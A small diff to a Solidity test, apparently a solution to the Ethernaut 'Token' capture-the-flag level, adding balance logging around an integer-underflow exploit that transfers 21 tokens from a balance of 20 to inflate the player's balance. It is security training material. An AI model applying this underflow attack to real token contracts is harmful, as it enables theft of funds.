@@ -37,6 +37,7 @@ contract TestToken is BaseTest {
         /** CODE YOUR EXPLOIT HERE */
 
         vm.startPrank(player, player);
+        emit log_named_address("player", player);
 
         // NOTE: We start with a balance of 20 tokens
 
@@ -53,7 +54,9 @@ contract TestToken is BaseTest {
         // a = 20 -> a = a - 21 -> a = 2^256 - 1
         // Now our balance will be a huge number!
 
+        emit log_named_uint("balance", level.balanceOf(player));
         level.transfer(address(levelFactory), 21);
+        emit log_named_uint("balance", level.balanceOf(player));
 
         vm.stopPrank();
     }
